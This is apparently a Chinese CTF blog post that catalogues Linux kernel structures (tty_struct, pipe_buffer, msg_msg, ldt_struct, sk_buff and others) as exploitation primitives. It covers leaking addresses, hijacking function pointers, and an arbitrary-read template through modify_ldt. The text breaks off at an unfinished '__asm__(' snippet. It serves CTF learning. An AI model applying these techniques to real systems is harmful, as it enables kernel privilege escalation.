---
layout: post
title: 0xFF. Linux kernel：结构体总结
category: kernel pwn
date: 2024-7-29 14:00:00
---

难道不应该打`__free_hook`吗

<!-- more -->

[toc]

# 能够利用的结构体

## 0x00. tty_struct (kmalloc-1k | GFP_KERNEL_ACCOUNT)

### 属性

#### 总结

- 通过`open("/dev/ptmx", 2)`来打开

- 大小：`kmalloc-1k`

- 分配`flag`：`GFP_KERNEL_ACCOUNT`
- 泄露内核基地址
- 泄露堆地址
- 劫持程序控制流

#### 打开方式

打开`/dev/ptmx`，但需要注意是否挂载了`pts`，若没有挂载则无法打开

#### 魔数

`tty_struct`在结构体起始位置`int magic`含有魔数`0x5401`，可以方便我们搜索该结构体。

#### 利用效果

- 利用函数指针劫持程序控制流

- 参数可控，其第一个参数为`tty_struct`的地址

- 泄露内核基地址

- 泄露内核堆地址

#### 结构体

位于`include/linux/tty.h`，如下所示：

```c
struct tty_struct {
    int    magic;
    struct kref kref;
    struct device *dev;    /* class device or NULL (e.g. ptys, serdev) */
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;

    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;

    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    char name[64];
    unsigned long flags;
    int count;
    struct winsize winsize;        /* winsize_mutex */

    struct {
        spinlock_t lock;
        bool stopped;
        bool tco_stopped;
        unsigned long unused[0];
    } __aligned(sizeof(unsigned long)) flow;

    struct {
        spinlock_t lock;
        struct pid *pgrp;
        struct pid *session;
        unsigned char pktstatus;
        bool packet;
        unsigned long unused[0];
    } __aligned(sizeof(unsigned long)) ctrl;

    int hw_stopped;
    unsigned int receive_room;    /* Bytes free for queue */
    int flow_change;

    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;        /* protects tty_files list */
    struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;

/* Each of a tty's open files has private_data pointing to tty_file_private */
struct tty_file_private {
    struct tty_struct *tty;
    struct file *file;
    struct list_head list;
};

/* tty magic number */
#define TTY_MAGIC        0x5401
```

其中含有一个函数表结构体，即`tty_operations`，如下所示：

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    unsigned int (*write_room)(struct tty_struct *tty);
    unsigned int (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
    int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

### 利用

#### 数据泄露 - 内核基地址

`tty_operations`会被初始化为全局变量`ptm_unix98_ops`或者`pyt_unix98_ops`，而即使开启`kaslr`，低三位不变。

因此可以通过该数值来获取内核基地址。在`/proc/kallsyms`中也可以查看：

```bash
/ # cat /proc/kallsyms | grep 'ptm_unix98_ops'
ffffffff98083ca0 r ptm_unix98_ops
/ # cat /proc/kallsyms | grep 'pty_unix98_ops'
ffffffff98083b80 r pty_unix98_ops
```

#### 数据泄露 - 堆地址

`tty_struct`中的`dev`与`driver`是通过`kmalloc`分配的，因此可以通过这两个成员泄露内核地址。

#### 劫持程序控制流

劫持`tty_operations`函数表即可，例如劫持其中的`write`函数指针，即可通过`write`系统调用时，设置`tty_struct`的`fd`即可调用劫持后的`write`函数。

参数可控，第一个参数`rdi`即为`tty_struct`的地址。

## 0x01. seq_file (kmalloc-32 | GFP_KERNEL_ACCOUNT)

### 属性

#### 总结

- 通过`open("/proc/self/stat", O_RDONLY)`来打开

- 大小：`kmalloc-32`
- 分配`flag`：`GFP_KERNEL_ACCOUNT`
- 泄露内核基地址
- 不带参数劫持程序控制流

#### 打开方式

以**只读方式**打开文件`/proc/self/stat`，申请得到的是`seq_operations`结构体，**注意不是**`seq_file`

#### 魔数

无

#### 利用效果

- 劫持程序控制流，无法控制参数
- 泄露内核基地址

#### 结构体

`seq_file`会单独从`seq_file_cache`分配，一般难以控制。其结构体为：

```c
struct seq_file {
    char *buf;
    size_t size;
    size_t from;
    size_t count;
    size_t pad_until;
    loff_t index;
    loff_t read_pos;
    struct mutex lock;
    const struct seq_operations *op;
    int poll_event;
    const struct file *file;
    void *private;
};
```

而其中`seq_operations`函数表结构体可以打开`/proc/self/stat`来获取，其结构体为：

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

注意其中参数并不可控。

### 利用

#### 数据泄露 - 泄露内核基地址

`seq_operations`函数表中的第一个函数指针`start`即为函数`single_start`函数的地址，可以用于泄露内核基地址：

```bash
/ # cat /proc/kallsyms | grep 'single_start'
ffffffffb6c4b160 T single_start
```

其实其余的同理，即`single_stop`，`single_next`，`single_show`

#### 劫持程序控制流

覆盖`seq_operations`函数表中的函数指针`start`。

对该结构体调用`read`，即可以触发`seq_operations->start`控制程序执行流。

注意参数不可控，一般可能需要配合`pt_regs`等结构体。

**若需要调试，可以暂停到`seq_read_iter`函数，其会调用`seq_operations->start`**

## 0x02. user_key_payload (kmalloc-any, GFP_KERNEL)

### 属性

#### 总结

- 通过`add_key`系统调用打开（会有临时`obj`）

- 大小：任意，且是由用户指定的
- 分配`flag`：`GFP_KERNEL`、`__GFP_HARDWALL`、`__GFP_NOWARN`
- 可以泄露内核基地址
- 可以泄露内核堆地址
- 通过越界读，无需驱动提供`read`即可泄露内核基地址

#### 打开方式

通过`add_key()`系统调用为用户申请密钥时，会遵循如下流程来打开结构体：

- 从内核中分配`obj1`和`obj2`，分别用于保存`description`和`payload`。其中`desciption`的大小为其内容长度，而`payload`大小由我们设置的`plen`指定。
- 再次分配`obj3`和`obj4`。`obj3`和`obj1`一模一样，并将`obj1`内容复制到`obj3`；`obj4`和`obj2`一模一样，并将`obj4`内容复制到`obj2`。
- 释放`obj1`和`obj2`，返回分配密钥的`id`

可以看到，无论是对于`desctiption`还是`payload`，它们**都会有一个临时的`obj`**。此外，在我们利用时，我们最好将`description`的值设置为和`payload`大小以及别的结构体毫不相关，直接不考虑`desciption`来简化利用过程。

如此一来，只考虑`payload`的情况下，流程为：

- 申请大小为`plen`的保存`payload`的`obj1`，其`flag`为`GFP_KERNEL`
- 再次申请一个大小和类型都一样的`obj2`，将`obj1`复制到`obj2`，并释放`obj1`

如此我们可以理清楚`add_key`系统调用的流程。

#### 魔数

无

#### 利用效果

- 泄露内核基地址
- 泄露内核堆地址
- 通过越界读来读取地址

#### 结构体

主要作为越界读这个利用方式的`user_key_payload`的结构体如下所示：

```c
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};
```

其中，`struct rcu_head`结构体如下所示：

```c
struct callback_head {
	struct callback_head *next;
	void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

不难得知`user_key_payload`的头部（即`struct rcu_head`和`datalen`）一共为`0x18`字节。剩下的`data[]`数组是保存`payload`本身。

### 利用

#### 数据泄露 - 泄露内核基地址

当通过`key_revoke`来销毁密钥时，`rcu->func`（可以查看上面的结构体）将会被赋值为`user_free_payload_rcu`函数的地址，该函数地址和内核偏移固定，可以通过`/proc/kallsyms`查看其地址，如下所示：

```c
/# cat /proc/kallsyms | grep 'user_free_payload_rcu'
```

#### 数据泄露 - 泄露堆地址

和刚刚提到的方法异曲同工，即通过`rcu->next`来泄露堆地址

#### 数据泄露 - 越界读（无需驱动提供read）

上面我们写了泄露内核基地址的方法。但该方法即使存在`UAF`，也需要驱动本身提供一个`read`功能，而若驱动本身提供了`read`功能，那我们实际上也不是很需要用`user_key_payload`来打了....

实际上`user_key_payload`最主要的作用就是其存在读取自身`payload`的功能，且其是根据结构体里的长度`datalen`来读取的。若我们能够控制`datalen`为一个大于其`payload`长度的数字，即可实现越界读，若能够读到其它被释放的`user_key_payload`结构体，即可获取到程序基地址。

总结流程：

- 修改`user_key_payload`的`datalen`
- 调用`keyctl_read`系统调用，来根据`datalen`越界读数据
- 读到其他被释放的`user_key_payload`，即可读到其中`rcu->func`，泄露内核基地址

## 0x03. pipe_buffer(kmalloc-1k | GFP_KERNEL_ACCOUNT)

### 属性

#### 总结

- 通过`void pipe(int fd[])`函数来打开
- 同时打开`pipe_inode_info`和`pipe_buffer`两个结构体
- **需要注意的是需要写`pipe_fd[1]`成功后才会初始化`pipe_buffer`**
- `pipe_inode_info`的大小为`kmalloc-192`，分配`flag`为`GFP_KERNEL_ACCOUNT`
- `pipe_buffer`的大小为`kmalloc-1k`（注意为`1024`），分配`flag`为`GFP_KERNEL_ACCOUNT`

#### 打开方式

通过`pipe`函数来打开一个管道即可创建`pipe_inode_info`和`pipe_buffer`两个结构体。

如下所示：

```c
int pipe_fd[2];
pipe(pipe_fd);
```

要获得`pipe_buffer`还需要往管道写数据：

```c
int pipe_fd[2];
if (pipe(pipe_fd) < 0){
    err_exit("Failed to open pipe.");
}
if (write(pipe_fd[1], temp, 0x8) < 0){
    err_exit("Failed to write pipe.");
}
```



#### 魔数

无

#### 利用效果

- 劫持程序控制流
- 其`rdi`和`rsi`均可控，`rdi`为`struct pipe_inode_info`，`rsi`为`struct pipe_buffer`
- 泄露内核基地址

#### 结构体

打开管道时会创建两个结构体，其中之一为`pipe_inode_info`

( `kmalloc-192 | GFP_KERNEL_ACCOUNT` )

```c
struct pipe_inode_info {
	struct mutex mutex;
	wait_queue_head_t rd_wait, wr_wait;
	unsigned int head;
	unsigned int tail;
	unsigned int max_usage;
	unsigned int ring_size;
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss;
#endif
	unsigned int nr_accounted;
	unsigned int readers;
	unsigned int writers;
	unsigned int files;
	unsigned int r_counter;
	unsigned int w_counter;
	struct page *tmp_page;
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	struct pipe_buffer *bufs;
	struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue;
#endif
};
```

与另一个结构体`pipe_buffer`（为什么是`kmalloc-1k`？因为实际上创建`pipe`时会有诸多个该结构体）：

( `kmalloc-1k | GFP_KERNEL_ACCOUNT` )

```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

其中函数指针表`pipe_buf_operations`为：

```c
struct pipe_buf_operations {
	/*
	 * ->confirm() verifies that the data in the pipe buffer is there
	 * and that the contents are good. If the pages in the pipe belong
	 * to a file system, we may need to wait for IO completion in this
	 * hook. Returns 0 for good, or a negative error value in case of
	 * error.  If not present all pages are considered good.
	 */
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};
```

### 利用

#### 数据泄露 - 泄露内核基地址

`pipe_buffer->pipe_buf_operations`指向全局函数表，可以通过该函数表的地址来泄露出内核基地址

#### 数据泄露 - 泄露pipe_buffer地址

`pipe_inode_info`中有一个指向`struct pipe_buffer`的指针，可以通过该指针来获取申请到的`pipe_buffer`的地址。即`(pipe_inode_info[16])`。（注：只是通过`user_key_payload`泄露时才是`buf[16]`，具体还待笔者补充）

#### 劫持程序控制流

劫持`pipe_buffer`的函数指针表，覆盖里面的`release`函数指针。

在调用`close`关闭管道时，会调用`pipe_buffer -> pipe_buffer_operations -> release() `

其`rdi`和`rsi`均可控，`rdi`为`struct pipe_inode_info`，`rsi`为`struct pipe_buffer`。

（因此，或许可以利用`gadget`将栈迁移到`pipe_buffer`。或许可以`push rsi; pop rsp`？）

调试时可以暂停到`pipe_buf_release`。

```
pipe_release()
    put_pipe_info()
        free_pipe_info()
            pipe_buf_release()
                pipe_buffer->pipe_buf_operations->release() // it should be anon_pipe_buf_release()
```



## 0x04. msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)

### 属性

#### 总结

- 几乎任意大小的对象分配，修改`m_ts`达到越界读泄露数据。


#### 详解

首先其结构如下所示：

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202410081433135.jpeg)

上面左边第一个结构体为`msg_msg`，其大小是我们指定的。若超过一页，则才会继续分配`msg_msgseg`结构体。

在`msg_msg`结构体中，前`0x30`大小的为`header`，是不包括在用户申请的大小的。其余每个字段的解释如下：

- 第一个为`struct list_head m_list`，大小为`0x10`。为一个`msg_msg`的双向链表。**该结构体中两个指针不能覆盖为非法地址，否则会发生错误。常见于通过`msg_rev`时，未设置`MSG_COPY`时，其会释放`msg_msg`从而检查这两个字段。**
- 第二个为`m_type`，其表示消息种类，例如我们发送消息时将其设置为`1`，则接受时也需要设置为`1`。可以任意指定，但不能设置为`0`，笔者暂不清楚原因，只是自己尝试的时候发现设置为`0`时会报错。
- 第三个为`m_ts`，表示消息的大小。注意，该大小不包括`header`的大小。将该值改大，即可越界读数据来泄露地址。很显然，若`next`指针为`NULL`，那么该值最大为`0x1000 - 0x30`。
- 第四个为`struct msg_msgseg* next`，指向同一个消息剩下的部分，即为`struct msg_msgseg`。**将该指针劫持为任意地址，可以有两个用法：1. 通过`msg_recv`设置`MSG_COPY`，可以任意地址读；2. 通过`msg_recv`不设置`MSG_COPY`，可以任意地址释放。**但任意地址释放又要注意，需要指针指向的地方为`NULL`才可以。
- 第五个为`void* security`，同样知道不能覆盖即可。
- 使用`MSG_COPY`标志位时需要注意：1. 使用`MSG_COPY`时的`msgrcv`需要保证读取的字节数完全等于（实际上小于等于即可，但明显我们需要等于）此时的`m_ts`，否则会报错；2. 使用`MSG_COPY`时的`msgrcv`中的第四个参数`m_type`和平常不同，其表示按顺序的第几个消息，而不是像以前那样按序号。



在分配、读取、释放对象之前，我们需要先获得一个消息的`id`，用于标识`msg`：

```c
int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

```

我们通过发送消息，来进行对象的分配，如下所示：

值得注意的是，分配后的整个`obj`的大小为我们申请的大小加上`header=0x30`。

```c
/**
 * msgid  表示消息的id
 * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
 * msgsz  表示消息的大小，也就是msg_msg的m_ts
 * msgtyp 表示消息的种类
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

```

对于接受消息（读取内容），根据设置的`flag`不同，有两种接受策略，一是设置`MSG_COPY`字段，其单纯查看消息。二是不设置`MSG_COPY`字段，其会接受消息后，销毁原有消息。封装后如下所示。

仅仅接受消息，不销毁：

```c
/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
/**
 * msgid  表示消息的id
 * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
 * msgsz  表示消息的大小，也就是msg_msg的m_ts
 * msgtyp 表示消息的种类
 */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}
```

接受消息，并释放（`kfree`）：

```c
/**
 * msgid  表示消息的id
 * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
 * msgsz  表示消息的大小，也就是msg_msg的m_ts
 * msgtyp 表示消息的种类
 */
int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

```

### 结构体补充

首先是`msg_queue`，对于每一个`msgget`都有一个：

```c
/* one msq_queue structure for each present queue on the system */
struct msg_queue {
	struct kern_ipc_perm q_perm;
	time64_t q_stime;		/* last msgsnd time */
	time64_t q_rtime;		/* last msgrcv time */
	time64_t q_ctime;		/* last change time */
	unsigned long q_cbytes;		/* current number of bytes on queue */
	unsigned long q_qnum;		/* number of messages in queue */
	unsigned long q_qbytes;		/* max number of bytes on queue */
	struct pid *q_lspid;		/* pid of last msgsnd */
	struct pid *q_lrpid;		/* last receive pid */

	struct list_head q_messages;  // 只有一条消息时，指向msg_msg的m_list
	struct list_head q_receivers;
	struct list_head q_senders;
} __randomize_layout;
```

此外是`msg_msg`：

```c
/* one msg_msg structure for each message */
struct msg_msg {
	struct list_head m_list; // 只有一条消息时，指向msg_queue的q_messages
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
```



## 0x05.  ldt_struct (kmalloc-16(slub)/kmalloc-32(slab) | GFP_KERNEL)

该结构体相关的系统调用类似一个菜单，因此我们没有按照统一的方式来进行编写

其主要的作用是：

- 通过修改`ldt->entries`，配合`read_ldt`进行任意地址读
- 绕过`harden usercopy`，可以通过`fork`创建子进程并通过子进程来`read_ldt`

### 结构体

```c
struct ldt_struct {
    /*
     * Xen requires page-aligned LDTs with special permissions.  This is
     * needed to prevent us from installing evil descriptors such as
     * call gates.  On native, we could merge the ldt_struct and LDT
     * allocations, but it's not worth trying to optimize.
     */
    struct desc_struct    *entries;
    unsigned int        nr_entries;

    /*
     * If PTI is in use, then the entries array is not mapped while we're
     * in user mode.  The whole array will be aliased at the addressed
     * given by ldt_slot_va(slot).  We use two slots so that we can allocate
     * and map, and enable a new LDT without invalidating the mapping
     * of an older, still-in-use LDT.
     *
     * slot will be -1 if this LDT doesn't have an alias mapping.
     */
    int            slot;
};
```

### 系统调用

通过一个叫做`modify_ldt`的系统调用来进行，该系统调用的源码如下：

```c
SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
        unsigned long , bytecount)
{
    int ret = -ENOSYS;

    switch (func) {
    case 0:
        ret = read_ldt(ptr, bytecount);
        break;
    case 1:
        ret = write_ldt(ptr, bytecount, 1);
        break;
    case 2:
        ret = read_default_ldt(ptr, bytecount);
        break;
    case 0x11:
        ret = write_ldt(ptr, bytecount, 0);
        break;
    }
    /*
     * The SYSCALL_DEFINE() macros give us an 'unsigned long'
     * return type, but tht ABI for sys_modify_ldt() expects
     * 'int'.  This cast gives us an int-sized value in %rax
     * for the return code.  The 'unsigned' is necessary so
     * the compiler does not try to sign-extend the negative
     * return codes into the high half of the register when
     * taking the value from int->long.
     */
    return (unsigned int)ret;
}
```

其中，我们常用到`read_ldt`和`write_ldt`两种系统调用，用户需要传递三个参数，分别为`func`函数、`ptr`指向`struct user_desc`的指针，和`bytecount`。

其调用方法常常如下：

`read_ldt`：

```c
syscall(SYS_modify_ldt, 0, (struct user_desc*)&strct, bytecount); // bytecount为读取的字节数
```

`write_ldt`:

```c
syscall(SYS_modify_ldt, 1, (struct user_desc*)&strct, sizeof(strct));
```

### read_ldt

主要存在如下逻辑：

```c
static int read_ldt(void __user *ptr, unsigned long bytecount)
{
//...
    if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
        retval = -EFAULT;
        goto out_unlock;
    }
//...
out_unlock:
    up_read(&mm->context.ldt_usr_sem);
    return retval;
}
```

可以看到其使用`copy_to_user`向用户的`user_desc`结构体拷贝了数据。因此，若能够控制`ldt->entries`，相当于实现了内核任意地址读。

另一方面，在`ldt_struct`结构体的中的`entries`指针也位于第一个字段，控制起来也比较方便。

需要注意的是使用时需要注意`desc`的编写，具体值可以参照下面的数据泄露模板中的值。

### write_ldt

其会使用`alloc_ldt_struct()`函数来分配一个新的`ldt_struct`，并将其应用到进程，其主要逻辑如下：

```c
/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */
static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
{
    struct ldt_struct *new_ldt;
    unsigned int alloc_size;

    if (num_entries > LDT_ENTRIES)
        return NULL;

    new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL);
//...
```

可以看到其会直接分配一个`GFP_KERNEL`的`obj`。

通过`read_ldt`和`write_ldt`，不难想到在`UAF`时可以配合实现内核任意地址读。

### 绕过hardened usercopy

只需要通过`fork`创建子进程，然后使用子进程来`read_ldt`就可以。

**笔者这里其实不太清楚绕过该保护的细节：虽然在`fork`时，会将父进程的`ldt`拷贝给子进程，该阶段完全处于内核态，不会被检测到；但子进程仍然需要调用`read_ldt`来从内核态将数据拷贝到用户态不是吗？为什么这里绕过了笔者还不太清楚。**

### 数据泄露模板

来自`arttnba3`师傅：

```c
/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

	struct user_desc desc;
	uint64_t page_offset_base;
	uint64_t secondary_startup_64;
	uint64_t kernel_base = 0xffffffff81000000, kernel_offset;
	uint64_t search_addr, result_addr = -1;
	uint64_t temp;
	char *buf;
    int pipe_fd[2];

    /* init descriptor info */
    desc.base_addr = 0xff0000;
    desc.entry_number = 0x8000 / 8;
    desc.limit = 0;
    desc.seg_32bit = 0;
    desc.contents = 0;
    desc.limit_in_pages = 0;
    desc.lm = 0;
    desc.read_exec_only = 0;
    desc.seg_not_present = 0;
    desc.useable = 0;

	/**
	 * do something to make the following ldt_struct to be modifiable,
	 * e.g. alloc and free a 32B GFP_KERNEL object under a UAF. 
	 * 
	 * Your code here:
	 */

    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while(1) {
        /**
         * do something to modify the ldt_struct->entries
         * Your code here:
         */

        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0) {
            printf("[-] read data: %llx\n", temp);
            break;
        }
        else if (retval == 0) {
            err_exit("no mm->context.ldt!");
        }
        page_offset_base += 0x1000000;
    }
    printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%llx\n", 
           page_offset_base);

	/* leak kernel base from direct mappinig area by modify_ldt() */
    /**
	 * do something there to modify the ldt_struct->entries 
	 * to page_offset_base + 0x9d000, pointer of secondary_startup_64() is here,
	 * read it out and we can get the base of `.text` segment.
	 * 
	 * Your code here:
	 */

    syscall(SYS_modify_ldt, 0, &secondary_startup_64, 8);
    kernel_offset = secondary_startup_64 - SECONDARY_STARTUP_64;
    kernel_base += kernel_offset;
    printf("\033[34m\033[1m[*]Get addr of secondary_startup_64: \033[0m%llx\n",
           secondary_startup_64);
    printf("\033[34m\033[1m[+] kernel_base: \033[0m%llx\n", kernel_base);
    printf("\033[34m\033[1m[+] kernel_offset: \033[0m%llx\n", kernel_offset);

	/* search for something in kernel space */
	pipe(pipe_fd);
    buf = (char*) mmap(NULL, 0x8000, 
                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 
                        0, 0);
    while(1) {
        /**
         * modify the ldt_struct->entries to `search_addr` here,
         * if you have to modify the ldt_struct->nr_entries at the same time,
         * set it to `0x8000 / 8` is just okay.
         *
         * Your code here:
         */

        if (!fork()) {
            /* child process */
            char *find_addr;

            syscall(SYS_modify_ldt, 0, buf, 0x8000);
            /* search for what you want there, this's an example */
            find_addr = memmem(buf, 0x8000, "arttnba3", 8);
            if (find_addr) {
                result_addr = search_addr + (uint64_t)(find_addr - buf);
            }
            write(pipe_fd[1], &result_addr, 8);
            exit(0);
        }
        /* parent process */
        wait(NULL);
        read(pipe_fd[0], &result_addr, 8);
        if (result_addr != -1) {
            break;
        }
        search_addr += 0x8000;
    }

    printf("\033[34m\033[1m[+] Obj found at addr: \033[0m%llx\n", result_addr);
```

## 0x06. sk_buff(大于kmalloc-512的任意obj读写)

类似于`setxattr`，但`sk_buff`功能更强大，但仅适用于`kmalloc-512`以上的`obj`。

### 功能

可以分配任意大于等于`kmalloc-512`的`obj`并写入内容，还可以读取内容同时`free`。

`sk_buff`本身是`linux kernel`中网络协议栈的一个结构体。其指示一个数据包的`head`、`tail`等信息。其结构体本身不太可控且会从独立的`slub`中分配，但它会将用户输入的内容用常规的`kmalloc`分配，其大小为用户数据加上一个`tail`尾部数据。由于尾部数据大小为`320`字节，因此最小分配的`obj`也是`kmalloc-512`。

### 定义

使用前需要先初始化。

```c
int sk_socket[2];

int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket);
if (ret < 0)
{
    err_exit("Failed to initial sk_socket.");
}
```

### 分配 & 编辑

很简单，直接`write`写入用户的内容即可。

```c
// 第二个参数为写入的内容，第三个参数为写入的大小减去320，320为尾部大小
// 例如这里要申请一个kmalloc-1024即0x400的obj，则第三个参数为0x400-320
int ret = write(sk_socket[0], buf, 0x400 - 320);
if (ret < 0)
{
    err_exit("Failed to send sk_buf.");
}
```

### 释放 & 读取

同样很简单，通过`read`读取用户内容即可。注意这里接收数据的同时还会释放`obj`。

```c
int ret = read(sk_socket[1], buf, 0x400 - 320);
if (ret < 0)
{
    err_exit("Failed to recv sk_buf.");
}
```





## 0x00. 

### 属性

#### 总结

- 

#### 打开方式



#### 魔数



#### 利用效果

- 

#### 结构体



### 利用

#### 数据泄露 - 内核基地址



#### 数据泄露 - 堆地址



#### 劫持程序控制流

# 常用结构体/函数

## 0x00. work_for_cpu_fn函数

实际上`work_for_cpu_fn`并不是结构体，只是在**开启了多核支持的`CPU`上**都有的一个函数。因此这里我们记录得简短一些。

```c
struct work_for_cpu {
    struct work_struct work;
    long (*fn)(void *);
    void *arg;
    long ret;
};
 
static void work_for_cpu_fn(struct work_struct *work)
{
    struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
 
    wfc->ret = wfc->fn(wfc->arg);
}
```

可以简单理解为如下形式：

```c
static void work_for_cpu_fn(size_t * args)
{
    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));
}
```

可以看到，其将参数得第四个值作为函数，而参数的第五个值作为函数的参数执行。这让我们有简单的方式来直接执行一个带参数的函数。（要是`system("/bin/sh")`或许已经拿下了）。

例如，若我们将`tty_operations`中的函数指针劫持为`work_for_cpu_fn`，此时函数的参数为`tty_struct`。

由此，对`tty_struct`执行`ioctl`即可执行：

```c
((void*)tty_struct[4])(tty_struct[5]);
```

注意这里需要执行`ioctl`。

## 0x01. pt_regs结构体

主要利用位于低版本：当用户代码进入内核态时，用户态寄存器的值会放在内核态的底部。因此，可以通过布置适当的寄存器值，从而使得内核态中可以根据`pt_regs`结构体的值来进行`rop`等操作。

定义如下所示：

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
    unsigned long r15;
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
    unsigned long orig_rax;
/* Return frame for iretq */
    unsigned long rip;
    unsigned long cs;
    unsigned long eflags;
    unsigned long rsp;
    unsigned long ss;
/* top of stack page */
};
```

若需要在`CTF Linux kernel`中使用，可以使用如下板子：

```c
__asm__(
